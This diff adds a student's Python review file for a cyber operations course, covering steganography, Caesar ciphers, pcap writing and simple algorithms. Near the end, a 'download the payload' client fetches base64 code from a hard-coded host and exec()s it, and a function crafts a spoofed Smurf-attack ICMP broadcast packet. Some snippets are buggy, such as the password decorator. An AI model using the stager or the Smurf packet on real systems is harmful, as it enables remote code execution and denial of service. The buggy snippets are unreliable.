@@ -1,0 +1,757 @@
+# Garcia-Deliverables.py
+# For: CYBOLC 18-505 Python class review
+# By: Jeffrey Garcia
+# Last edit: 15 Feb 2019, 0730
+# Known issues: Pe1 Part5 reuses some function names and slightly modifies them so that may change expected behaivior if you try to run all of the pe parts at once.
+
+#!/usr/bin/env python3 
+
+#------------------------- Pe1 part 1------------------------#
+def invert(l): 
+    '''Inverts the given list 
+    Args: 
+        l (list): list of strings representing integers in the range [0-255] 
+    Returns:
+        None
+    ''' 
+    for i in range(len(l)): 
+        l[i] = str(255 - int(l[i]))  
+def inverted(l): 
+    '''Returns a new list that is the given list inverted 
+    Args: 
+        l (list): list of strings representing integers in the range [0-255] 
+    Returns: 
+        list: new list that is the given list inverted 
+    ''' 
+    comp = [str(255 -int(n)) for n in l] 
+    return comp 
+
+if __name__ == '__main__': 
+    pass
+
+#------------------------ Pe1 Part 2--------------------------#
+#!/usr/bin/env python3 
+
+def steg_encode_char(char, cover): 
+    '''LSB encodes a character 
+    Args: 
+        char (str): a single character string 
+        cover (list): list of 8 strings representing integers in the range [0-255] 
+    Returns: 
+        None 
+    ''' 
+    # Step 1. Create a list of chars that represents the ascii value for the character that I indend to encode 
+
+    ascii_char = format(ord(char),'0>8b')  # the ord function turns the char into an ascii value, the format function fills it in with zeros up to 8 characters for formatting reasons 
+
+    # Step 2. Use a loop to iterate over each of the characters that make up the cover 
+
+    for counter in range(len(cover)): 
+
+        # Step 2.a do the same thing for the cover character 
+
+        cover_char = list(format(int(cover[counter]), '0>8b')) # Do the same thing that I did for the ascii character. I need to use the int function on this because the list is made up of strings 
+
+        # Step 2.b change the last bit in each "cover character" to the next bit in the ascii string 
+
+        cover_char[-1] = ascii_char[counter] # replace the last character at position -1, with the character at the next position in ascii_char 
+
+        # Step 2.c put the new and improved "cover character" in the place of the old one  
+
+        cover[counter] = str(int(''.join(cover_char), 2)) # .join() turns the list back into a binary string. int() turns that string into a base 2 number. Finally, str() turns them back into strings so that they blend into the original list 
+
+def steg_decode_char(stego): 
+    '''LSB decodes a character 
+    Args: 
+        stego (list): list of 8 strings representing integers in the range [0-255] 
+    Returns: 
+        str: character that was decoded 
+    '''
+    
+    a = [] #create a blank list to fill up with ascii characters 
+
+    # Step 1. Go through each of the strings in stego and pull off the last bit from each of them.  
+
+    for c in range(len(stego)): 
+        a.append(list(format(int(stego[c]), '0>8b'))[-1]) 
+
+    # Step 2. Turn that byte back into a character and return it 
+
+    return chr(int(''.join(a), 2)) 
+    # or ---->>> return chr(int(''.join([bin(int(b))[-1] for b in stego), 2)) 
+
+if __name__ == '__main__': 
+    pass
+
+#------------------------ Pe1 Part3 -------------------------------------#
+#!/usr/bin/env python3 
+
+def steg_encode(msg, cover): 
+    '''LSB encodes a message 
+    Args: 
+        msg (str): a string message to encode 
+        cover (list): list of strings representing integers in the range [0-255] 
+    Returns: 
+        None'''
+    
+    coverindex = 0                                                  # Create an index to traverse the all of cover 
+    for char in msg:                                                # Create a loop to encode each character in msg 
+        charbin = format(ord(char),'0>8b')                          # Turn the character in question into a binary string  
+        for index in range(0,8):                                    # Nest this loop so we can modify 8 entries in cover per 1 character encoded 
+            coverbinl = list(format(int(cover[coverindex]),'0>8b')) # Turn the entry in question into a mutable list of binary characters 
+            coverbinl[-1] = charbin[index]                          # Replace the last character in the new cover entry we are creating with the next bit in the character 
+            cover[coverindex] = str(int(''.join(coverbinl),2))      # Stitch everything together into an entry that replaces the one we started with in the cover 
+            coverindex += 1                                         # Increment this so that we deal with the correct entry in cover every time 
+
+def steg_decode(stego): 
+    '''LSB decodes a message 
+    Args: 
+        stego (list): list of strings representing integers in the range [0-255] 
+    Returns: 
+        str: message that was decoded 
+    ''' 
+    # Step 1: build the massage from the ground up 
+
+    msg = []                                                        # Make an empty list to start putting each character into 
+
+    # Step 2: Pull out the message from each set of 8 entries in stego 
+
+    i = 0 
+    while i < len(stego): 
+        bitcounter = 0                                              # Use this to handle 8 bit chunks 
+        char = []                                                   # Empty list to build our character in 
+        while bitcounter < 8:                                       # Loop through the 8 bit chunk 
+            coverbin = bin(int(stego[i]))                           # Grab the binary of the entry that we want 
+            char.append(coverbin[-1])                               # Add the last bit from the cover item to the char 
+            bitcounter += 1                                         # Increment your counters 
+            i += 1 
+        msg.append(chr(int(''.join(char), 2)))                      # Turn char into an actual character and add it to msg 
+
+    return ''.join(msg)                                             # Stitch msg into a complete message and return it
+
+if __name__ == '__main__': 
+    pass
+#-------------------------- Pe1 Part 4 -----------------------------------#
+#!/usr/bin/env python3 
+
+  
+
+def read_pgm(filename):     # This works but it is super janky and unreasonably complex. Come back to it and fix it when you get a chance. Check the instructor example
+    '''Reads a PGM file 
+    Args: 
+        filename (str): the file name of a PGM file on disk to read from 
+    Returns: 
+        tuple: 
+            1st element is a list of PGM header values as strings 
+            2nd element is a list of pixel intensities as strings 
+    ''' 
+    with open(filename, 'r') as infile: 
+        comp = [] 
+        for line in infile: 
+            l = line.strip().split(' ') # I need this split becuase of the whitespace in the file 
+            for j in l: 
+                comp.append(j)          # Add j to the list
+    return (comp[:4],comp[4:])          # Split the list into two parts and make it a tuple
+
+''' Heres a better option from the instructor:
+with open(filename) as fp: 
+content = fp.read() 
+content = content.split() 
+return (content[:4], content[4:]) 
+''' 
+
+def write_pgm(filename,content): 
+    '''Writes a PGM file 
+    Args: 
+        filename (str): the file name to be used for the written file 
+        content (tuple): 
+            1st element is a list of PGM header values as strings 
+            2nd element is a list of pixel intensities as strings 
+    Returns: 
+        None 
+    '''
+    with open(filename, 'w') as infile: 
+        for con in content:                 # For each list in the tuple content 
+            for c in con:                   # For each element in the list con  
+                infile.write(c+'\n')        # write the element and add a newline 
+
+def invert(content): 
+    '''Modifies the pixel intensities of the given content to be inverted 
+    Args: 
+        content (tuple): 
+            1st element is a list of PGM header values as strings 
+            2nd element is a list of pixel intensities as strings 
+    Returns: 
+        None 
+    ''' 
+    for i in range(len(content[1])):        # Do what you did in the first invert, just over and over
+        content[1][i] = str(255 - int(content[1][i]))
+        
+if __name__ == '__main__': 
+    pass
+#------------------------ Pe1 Part5 ----------------------------------------------#
+''' This part reuses some code from earlier programs and modifies it slightly. You won't be
+able to run the whole file in one go the way you'd expect because of the reused function names'''
+#!/usr/bin/env python3 
+
+######################### Helper functions ########################################
+def sentinel(): 
+    return chr(128) 
+
+def steg_encode(msg, cover):  
+
+    coverindex = 0                                                  # Create an index to traverse the all of cover  
+    for char in msg:                                                # Create a loop to encode each character in msg  
+        charbin = format(ord(char),'0>8b')                          # Turn the character in question into a binary string   
+        for index in range(0,8):                                    # Nest this loop so we can modify 8 entries in cover per 1 character encoded  
+            coverbinl = list(format(int(cover[coverindex]),'0>8b')) # Turn the entry in question into a mutable list of binary characters  
+            coverbinl[-1] = charbin[index]                          # Replace the last character in the new cover entry we are creating with the next bit in the character  
+            cover[coverindex] = str(int(''.join(coverbinl),2))      # Stitch everything together into an entry that replaces the one we started with in the cover  
+            coverindex += 1                                         # Increment this so that we deal with the correct entry in cover every time  
+
+def steg_decode(stego):  
+    msg = []                                                        # Make an empty list to start putting each character into  
+    i = 0  
+    while i < len(stego):  
+        bitcounter = 0                                              # Use this to handle 8 bit chunks  
+        char = []                                                   # Empty list to build our charcter in  
+        while bitcounter < 8:                                       # Loop through the 8 bit chunk  
+            coverbin = bin(int(stego[i]))                           # Grab the binary of the entry that we want  
+            char.append(coverbin[-1])                               # Add the last bit from the cover item to the char  
+            bitcounter += 1                                         # Increment your counters  
+            i += 1  
+        char = chr(int(''.join(char), 2)) 
+        if char == sentinel():                                      # If the last character we decoded is our sentinel value... 
+            break                                                   # Then break out of the loop and stop decoding 
+                                                                    # Otherwise, 
+        msg.append(char)                                            # Add it to msg 
+    return ''.join(msg)                                             # Stitch msg into a complete message and return it 
+
+def read_pgm(filename):      
+
+    with open(filename) as fp:  
+        content = fp.read()  
+    content = content.split()  
+    return (content[:4], content[4:])  
+
+def write_pgm(filename,content):  
+
+    with open(filename, 'w') as infile:  
+        for con in content:                 # For each list in the tuple content  
+            for c in con:                   # For each element in the list con   
+                infile.write(c+'\n')        # write the element and add a newline  
+##################### End helper Functions #################################################
+
+def encode_pgm(msg,coverfilename,outputfilename): 
+    '''Encodes a message in a PGM file 
+    Args: 
+        msg (str): the message to encode 
+        coverfilename (str): the name of the PGM file on disk to use as the cover 
+        outputfilename (str): the name of the new PGM file to write 
+    Returns: 
+        None 
+    ''' 
+    content = read_pgm(coverfilename)                       # Pull the content out of the coverfile 
+    steg_encode(msg+sentinel(), content[1])                 # Encode the pixel brightness with the message and add in the stop flag 
+    write_pgm(outputfilename, content)                      # Write the new encoded file 
+
+def decode_pgm(filename): 
+    '''Decodes a message hidden in a PGM file 
+    Args: 
+        filename (str): the name of the PGM file that contains a hidden message 
+    Returns: 
+        str: the message that was encoded in the PGM file 
+    ''' 
+    content = read_pgm(filename)                            # Get the content from the file 
+    return steg_decode(content[1])                          # Use the new and improved decode (that looks for the stop flag) to get our message 
+
+if __name__ == '__main__': 
+    pass
+
+# ---------------------- Pe1 part6 ----------------------------------------#
+#!/usr/bin/env python3 
+
+def caesar_encrypt(plaintext,key): 
+    '''Encrypts plaintext using the Caesar Cipher 
+    Args: 
+        plaintext (str): a string to be encrypted (all lowercase) 
+        key (int): number of characters to shift 
+    Returns: 
+        str: the encrypted ciphertext 
+    ''' 
+    from collections import deque                       # Snag the deque object if we don't already have it
+    
+    alpha = 'abcdefghijklmnopqrstuvwxyz'                # Use this string to map our dictionary based on our key  
+    cipher =  deque(alpha)                              # Create a string of shifted letters 
+    cipher.rotate(key)                                  # Rotate the deque by the key value 
+    cipher = ''.join(cipher)                            # join the shifted letters into a string 
+    keyMap = str.maketrans(alpha, cipher)               # Create a dictionary mapping of plaintext to cipher text 
+    return plaintext.translate(keyMap)                  # Use the translate function to change our plaintext into ciphertext based on the key mapping that we created 
+
+def caesar_decrypt(ciphertext,key): 
+    '''Decrypts ciphertext using the Caesar Cipher 
+    Args: 
+        ciphertext (str): the string to be decrypted (all lowercase) 
+        key (int): number of characters to shift 
+    Returns: 
+        str: the decrypted plaintext 
+    ''' 
+    from collections import deque                       # Snag the deque object if we don't already have it 
+
+    alpha = 'abcdefghijklmnopqrstuvwxyz'                # Use this string to map our dictionary based on our key  
+    cipher =  deque(alpha)                              # Create a string of shifted letters 
+    cipher.rotate(-key)                                 # Rotate the deque by the negative key value 
+    cipher = ''.join(cipher)                            # join the shifted letters into a string 
+    keyMap = str.maketrans(alpha, cipher)               # Create a dictionary mapping of plaintext to cipher text 
+    return ciphertext.translate(keyMap)                  # Use the translate function to change our plaintext into ciphertext based on the key mapping that we created 
+
+if __name__ == '__main__': 
+    pass
+
+#----------------------- Pe1 Part 7 -------------------------------------------#
+#!/usr/bin/env python3 
+
+import nlp 
+import Part5 # Snag the code from the last two parts above for this to work
+import Part6 
+
+def caesar_brute(ciphertext,trainingtext): 
+    '''Decrypts ciphertext using brute-force 
+    Args: 
+        ciphertext (str): the string to be decrypted (mixed case) 
+        trainingtext (str): the works of Shakespeare as a single string 
+    Returns: 
+        str: the most likely decrypted plaintext 
+    ''' 
+    ref = nlp.vsm(trainingtext)                          # ref is my baseline value for human speech/text 
+    refDict = {}                                         # Create a dictionary to quickly search through 
+    for i in range(25):                                  # Loop through all possible keys 
+        plain = Part6.caesar_decrypt(ciphertext, i+1)    # Decrypt attempt with the next key 
+        plainRef = nlp.vsm(plain)                        # Get the vector space model of the 'plain-text' 
+        refDict[nlp.similarity(ref,plainRef)] = plain    # Make a dictionary entry using the similarity measure as the key and the text as the value 
+    return refDict[max(refDict)]                         # Return the text that has the highest similarity value to the baseline value 
+
+def prompt(): 
+    '''Prompts the user for the filenames of both the stego image and the training file 
+    Args: 
+        None 
+    Returns: 
+        tuple: LSB decoded ciphertext, contents of the training file as a single string 
+    ''' 
+    # Step 1. Gather file names 
+
+    stegoFile = input('Please enter the filename of the stegonography image: ')         
+    trainFile = input('Please enter the name of the training text file:  ')             
+
+    # Step 2. Decode the message from the stego file 
+
+    cipherMessage = Part5.decode_pgm(stegoFile)          # For some reason .lower() function is not working on this but I don't know why 
+
+    # Step 3. Get the training text from the training file 
+
+    with open(trainFile, 'r') as fp: 
+        trainText = fp.read() 
+
+    # Step 4. Return the encrypted message and the training text in a tuple  
+
+    return (cipherMessage, trainText) 
+
+if __name__ == '__main__': 
+    pass
+
+#---------------- Pe2 Part 1 --------------------------------------------------#
+#!/usr/bin/env python3 
+
+# Known improvements: This works but it uses the old logic that we defined in earlier exercises to encode and decode. The commented instructor example uses bitwise logic. 
+  
+from utility import * 
+
+###### Helper Functions ############################################## 
+
+  
+
+def sentinel():                                                     # Produce a sentinal value to sinal the end of an encoded message 
+    return chr(128)
+
+def steg_encode(msg, cover): 
+    '''Args: 
+        msg(bytes) = is a byte type representing a string to be encoded '''
+    
+    coverindex = 0                                                  # Create an index to traverse the all of cover  
+    for char in msg:                                                # Create a loop to encode each character in msg  
+        charbin = format(char,'0>8b')                               # Turn the character in question into a binary string  
+        for index in range(0,8):                                    # Nest this loop so we can modify 8 entries in cover per 1 character encoded  
+            coverbinl = list(format(int(cover[coverindex]),'0>8b')) # Turn the entry in question into a mutable list of binary characters  
+            coverbinl[-1] = charbin[index]                          # Replace the last character in the new cover entry we are creating with the next bit in the character                          
+            cover[coverindex] = int(''.join(coverbinl),2)           # Stitch everything together into an entry that replaces the one we started with in the cover  
+            coverindex += 1                                         # Increment this so that we deal with the correct entry in cover every time  
+
+def steg_decode(stego):  
+
+    msg = []                                                        # Make an empty list to start putting each character into  
+    i = 0  
+    while i < len(stego):  
+        bitcounter = 0                                              # Use this to handle 8 bit chunks  
+        char = []                                                   # Empty list to build our charcter in  
+        while bitcounter < 8:                                       # Loop through the 8 bit chunk  
+            coverbin = bin(int(stego[i]))                           # Grab the binary of the entry that we want  
+            char.append(coverbin[-1])                               # Add the last bit from the cover item to the char  
+            bitcounter += 1                                         # Increment your counters  
+            i += 1  
+        char = chr(int(''.join(char), 2)) 
+        if char == sentinel():                                      # If the last character we decoded is our sentinel value... 
+            break                                                   # Then break out of the loop and stop decoding 
+                                                                    # Otherwise, 
+        msg.append(char)                                            # Add it to msg 
+    return bytes(''.join(msg), encoding = 'utf8')                   # Stitch msg into a complete message formated as bytes and return it 
+
+def read_raw_pgm(filename):                                         # Read a pgm file and break it up into header information and the data stored within 
+    with open(filename, 'rb') as fp:                                # Open the filename that we pass in as a binary file   
+        content = bytearray(fp.read())                              # Read the file in as a mutable byte array  
+    ri = raster_index(content)                                      # Use the utility.raster_index() function to generate when   
+    return (content[:ri], content[ri:])                             # Split the byte content into a header and data section and return it 
+
+def write_pgm(filename,content):  
+    with open(filename, 'wb') as infile:  
+        for con in content:                                         # For each list in the tuple content 
+            infile.write(con)                                       # Write it in the file 
+###################################################################### 
+
+def encode_pgm(msg, infile, outfile): 
+    '''LSB encodes a message 
+    Args: 
+        msg (bytes): bytes object to encode 
+        infile (str): name of the raw PGM file on disk to use as the cover 
+        outfile (str): name of the new PGM file to write 
+    Returns: 
+        None 
+    ''' 
+    msg = bytearray(msg)                                        # Make is mutable and add the stop flag in 
+    msg.append(0x80) 
+    content = read_raw_pgm(infile)                              # Pull the content out of the coverfile    
+    steg_encode(msg, content[1])                                # Encode the pixel brightness with the messageand add in the stop byte to the message 
+    write_pgm(outfile, content)                                 # Write the new encoded file  
+
+''' Encoding bitwise example 
+from functools import lru_cache 
+
+    #helper: 
+@lru_cache(maxsize=0)                                           # This caches the values to trade memory for speed since we only see 256 possible byte permutations 
+
+def bits(byte): 
+
+    masks = [2**i for i in range(7,-1,-1)] 
+    return (1 if byte & mask else 0 for mask in masks)          # This has a turnary operator to define if we put 1s or zeros 
+
+def encode_lsb(msg, pgm, ri): 
+        for byte in msg: 
+            for bit in bits(byte): 
+                if bit and not (pgm[ri] & 1):                   # If you need to turn the lsb in the raster off 
+                    pgm[ri] |= 1 
+                elif not bit and (pgm[ri] & 1):                 # msg bit is off but we need to turn it on 
+                    pgm[ri] &= ~1 
+                ri += 1                                         # Move our position in the raster forward 
+
+Then you can just use the encode_lsb() function to do your thing! 
+''' 
+
+def decode_pgm(infile): 
+    '''LSB decodes a message 
+    Args: 
+        infile (str): name of the PGM file to read/decode 
+    Returns: 
+        bytes: message that was decoded from the PGM file 
+    ''' 
+
+    content = read_raw_pgm(infile)                            # Get the content from the file  
+    return steg_decode(content[1])                            # Use the new and improved decode (that looks for the stop flag) to get our message  
+
+''' Other example! 
+    msg = bytearray(0 
+    with open(infile, 'rb') as fp: 
+        data = fp.read() 
+    ri = raster_index(data) 
+    while True:                                                 # Start a semi-infinite loop that will break on the stop bit 
+        msgbyte = 0 
+        for shift in range (range(7,-1,-1):                     # This is going to shift from  
+            msgbyte |= (data[ri] & 1) << shift 
+            ri +=1 
+        if msgbyte == 0x80:                                     # If the byte is our stop flag 
+            break                                               # Break out of the loop 
+        msg.append(msgbyte)                                     # Otherwise, append the byte to the array 
+    return bytes(msg) 
+''' 
+
+if __name__ == '__main__': 
+    Pass
+
+# --------------- Download the payload exercise -------------------------------#
+#!/usr/bin/env python3 
+
+import socket 
+import base64 
+
+def client(connectto='10.25.2.127',port=12345): 
+    '''Connects to a server and attempts to base64 decode and execute the received payload 
+    Args: 
+        connectto (str): IPv4 address in dotted decimal notation of the server to connect to 
+        port (int): port number that the server is listening on 
+    Returns: 
+        None 
+    ''' 
+    # Step 0: initialize the stuff you need 
+
+    payload = bytearray() # extend this bytearray with data received until 0 bytes received    
+
+    # Step 1: connect to the sever 
+
+    s = socket.socket()                         # define a tcp socket 
+    s.connect((connectto,port))                 # connect to the ip and port provided 
+
+    # Step 2: download the payload until you recieve 0 bytes 
+
+    bytes_r = s.recv(1)                         # Request to take 1 byte at a time 
+    while len(bytes_r): 
+        payload.extend(bytes_r)                 # extend the payload by the amount of bytes we get 
+        bytes_r = s.recv(1)                     # ask for another byte 
+    s.close()                                   # close the connection
+    
+    # Step 3: decode the payload using base64 methods 
+
+    payload = base64.decodebytes(payload)       # decode using base 64 
+
+    # Step 4: compile and execute the payload 
+
+    payload = compile(payload, 'server', 'exec')                  # compile the payload 
+    exec(payload)                               # execute the payload 
+
+if __name__ == '__main__': 
+    client()
+
+#-------------------------- PCAP exercise ------------------------------------#
+#!/usr/bin/env python3 
+
+import pcap 
+import socket 
+import struct 
+
+
+def write_pcap(filename, packet): 
+
+    # Step 1. Populate pcap header with data 
+
+    magic = 0xa1b2c3d4              #4-byte unsigned int: 0xa1b2c3d4 
+    version_major = 2               #2-byte unsigned integer: 2 
+    version_minor = 4               #2-byte unsigned integer: 4 
+    thiszone = 0                    #4-byte unsigned int: gmt to local correction: 0 
+    sigfigs = 0                     #4-byte unsigned int: accuracy of timestamps: 0 
+    snaplen = 65535                 #4-byte unsigned int: max length saved portion of each pkt: 65535 
+    linktype = 101                  #4-byte unsigned int: data link type: 101     
+
+    # Step 2. Populate pcap packet header with data
+    
+    ts_sec = 0                      #4-byte unsigned int: 0 
+    ts_usec = 0                     #4-byte unsigned int: 0 
+    caplen = len(packet)            #4-byte unsigned int: length of packet 
+    leng = len(packet)              #4-byte unsigned int: length of packet 
+
+    # Step 3. Pack data into struct
+    
+    globe = struct.pack('!IHHIIII',magic, version_major,version_minor,thiszone,sigfigs,snaplen,linktype) # Pack the global header
+    head = struct.pack('!IIII', ts_sec, ts_usec, caplen, leng)                                           # Pack the pcap packet header
+
+    # Step 4. Write data to the pcap output file 
+
+    with open(filename, 'wb') as fp: 
+        fp.write(globe+head+packet) 
+
+def createSmurfAttack(): 
+    "This is a really janky way of using classes that isn't called for, but they helped me keep everything seperate in my head so I kept them" 
+
+    filename = 'packet.pcap' 
+
+    # Step 1. Populate the header values with data 
+
+    class IPHeader:                                             # IP Header 
+        form = '!BBHHHBBHBBBBBBBB'                              # define the format to pack the header 
+        #version = 4                                            # half a byte, 0100. This field is always a 4 because this is an ipv4 packet 
+        #IHL = 5                                                # half a byte, 0101. This field is the number of 32 bit words in the header. Because we are doing a 20 byte offset this is a 5 
+        verIHL = 4 << 4 | 5                                     # Combine version and IHL into one byte 
+        #DSCP = 0                                               # 6 bits. 0 is fine for this because it says it is undifferentiated data 
+        #ECN = 0                                                # 2 bits. 0 is also fine here because it says that this packet is unsuported for ECN 
+        DSCPECN = 0                                             # Combined together these make a big zero that fills one byte 
+        TotalLength = 20                                        # 2 len short. In this project we are only using the header so our total length is 20 
+        ID = 0                                                  # 2 byte short. This is fine because it just ids the packet 
+        #Flags = 1                                              # 3 bits. This flag tells the next hop not to fragment 
+        #FragmentOffset= 0                                      # 13 bits 
+        FlagsAndFrags = 1 << 4 | 0                              # Combine the flags and fragment offset field to create a two byte combination 
+        TTL = 150                                               # 1 byte char 
+        Protocol = 1                                            # 1 byte char. protocol 1 is for ICMP 
+        HeaderChecksum = 0                                      # 2 byte short. Initialize at zero and calculate the checksum later 
+        SourceIP = socket.inet_aton('1.1.1.1')                  # 4 byte int. socket.inet_aton() turns an ip address into a 4 byte address 
+        DestinationIP = socket.inet_aton('255.255.255.255')     # 4 byte int 
+
+    class ICMPHeader: 
+        form = '!BBHHH'                                         # define the format to pack the header. Adds up to 8 bytes 
+        Type = 8                                                # 1 byte char 
+        Code = 0                                                # 1 byte char 
+        Checksum = 0                                            # 2 byte short. Initialize at zero and calculate the checksum later 
+        ID = 1                                                  # 2 byte short 
+        SequenceNumber = 3                                      # 2 byte short 
+
+    # Step 2. Pack data into struct ######################################################################################## 
+
+    # IP Header 
+    ip = IPHeader() 
+    ipinit = struct.pack(ip.form, ip.verIHL, ip.DSCPECN, ip.TotalLength, ip.ID, ip.FlagsAndFrags, ip.TTL, ip.Protocol, ip.HeaderChecksum, ip.SourceIP[0], ip.SourceIP[1], ip.SourceIP[2], ip.SourceIP[3], ip.DestinationIP[0],ip.DestinationIP[1],ip.DestinationIP[2],ip.DestinationIP[3])  
+
+    # ICMP Header 
+    icmp = ICMPHeader()                                         # Create an icmp header object 
+    icmpinit = struct.pack(icmp.form, icmp.Type, icmp.Code, icmp.Checksum, icmp.ID,icmp.SequenceNumber) # Create an initial byte object so we can calculate the checksum 
+
+    # Step 3. Calculate checksum using pcap.in_checksum ##################################################################### 
+
+    # IP Header 
+    ip.HeaderChecksum = pcap.in_checksum(ipinit, 20)     
+
+    # ICMP Header 
+    icmp.Checksum = pcap.in_checksum(icmpinit, 8)               # This calculates the checksum value and then assigns it to the icmpHeader object 
+
+    # Step 4. Repack data into structures ################################################################################### 
+
+    #IP Header 
+    ip = struct.pack(ip.form, ip.verIHL, ip.DSCPECN, ip.TotalLength, ip.ID, ip.FlagsAndFrags, ip.TTL, ip.Protocol, ip.HeaderChecksum, ip.SourceIP[0], ip.SourceIP[1], ip.SourceIP[2], ip.SourceIP[3], ip.DestinationIP[0],ip.DestinationIP[1],ip.DestinationIP[2],ip.DestinationIP[3]) 
+
+    #ICMP Header 
+    icmp = struct.pack(icmp.form, icmp.Type, icmp.Code, icmp.Checksum, icmp.ID,icmp.SequenceNumber) # Repack it now that we have a real checksum. This may not be the best but it should work  
+
+    # Step 5. Write the buffer to file using write_pcap() ################################################################### 
+    # ----> combine the IP and ICMP headers 
+
+    packet = ip + icmp                                          # combine the headers to make the packet we want to write 
+    write_pcap(filename, packet)                                # use the write function to write our file 
+
+if __name__ == '__main__': 
+    pass
+#------------------------------ Troubleshooting and the wrapper challenge thing we did on the last day ---------#
+#!/usr/bin/env python3 
+
+import hashlib 
+
+# SHA256 password hash 
+HASH='5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8' 
+
+''' 
+Write a decorator that, when applied to a function, prompts the 
+user for a password. Only execute the wrapped function if the 
+supplied SHA256 hash of the password matches HASH. Otherwise 
+print 'Access Denied'. 
+''' 
+
+def hash(func): 
+    def verify(): 
+        password = input('Enter your password: ') 
+        passhash = hashlib.sha256(password.encode()).hexdigest() 
+        if passhash != HASH: 
+            return 'Wrong password' 
+        func() 
+    return verify() 
+
+@hash 
+def get_resource(): 
+    print( 'resource') 
+
+if __name__ == '__main__': 
+    print(get_resource()) 
+
+################################################################################################################################################################################## 
+#!/usr/bin/env python3 
+
+import random 
+import math 
+
+def approximate_pi(count): 
+    '''Approximates the value of PI using the Monte Carlo method. 
+    Args: 
+        count (int): number of random points to generate 
+    Returns: 
+        int: calculated approximation of PI 
+    ''' 
+    hit = 0 
+    for i in range(count): 
+        x = (random.random()*2)-1.0 
+        y = (random.random()*2)-1.0 
+        if ((x**2)+(y**2))**0.5 < 1.0:  
+            hit += 1 
+    return hit/count*4 
+
+def letter_count(txt): 
+    '''Counts the number of occurances of each letter in the given text 
+    Args: 
+        txt (str): text consisting of alpha-numeric characters 
+    Returns: 
+        dict: dictionary whose keys are alpha-numeric characters and values are 
+              the number of occurances encountered in the given text 
+    ''' 
+    counts = dict() 
+    for letter in txt: 
+        if letter in counts: 
+            counts[letter] += 1 
+        else: 
+            counts[letter] = 1 
+    return counts 
+
+def cut(filename, delimeter=':'): 
+    '''Produces columns of text from lines of text using a delimeter 
+    Args: 
+        filename (str): name of the file to read from 
+        delimiter (str): single character string used to separate columns for each line 
+    Returns: 
+        list: list of lists of columns for each line 
+        Example: 
+        1:2:3 
+        4:5:6 
+        7:8:9 
+        [['1','2','3'], ['4','5','6'], ['7','8','9']] 
+    ''' 
+    data = [] 
+    try: 
+        with open(filename,'r') as fp: 
+            data.extend([line.strip().split(delimeter) for line in fp.readlines()]) 
+    except: 
+        print("Bad file name yo!") 
+    return data 
+
+def is_intersecting(c0,c1): 
+    '''Calculates whether 2 circles are intersecting 
+    Args: 
+        c0 (Circle): object with x, y, and radius attributes 
+        c1 (Circle): object with x, y, and radius attributes 
+    Returns: 
+        bool: True if the given circles intersect, otherwise False 
+    ''' 
+    distance = math.sqrt( (c1.x - c0.x)**2 + (c1.y - c0.y)**2 ) 
+    sum_of_radii = c0.radius + c1.radius 
+    if distance < sum_of_radii: 
+        return True 
+    else: 
+        return False
+
+def bubble_sort(l): 
+    '''Returns a new sorted list using the bubble sort algorithm 
+    Args: 
+       l (list): list of integers to sort 
+    Returns: 
+        None 
+    ''' 
+    newlist = l[:] 
+    for sortpass in range(len(l)-1, 0, -1): 
+        for index in range(sortpass): 
+            if newlist[index] > newlist[index+1]: 
+                temp = newlist[index] 
+                newlist[index] = newlist[index+1] 
+                newlist[index+1] = temp 
+    return newlist 
+
+if __name__ == '__main__': 
+    pass 
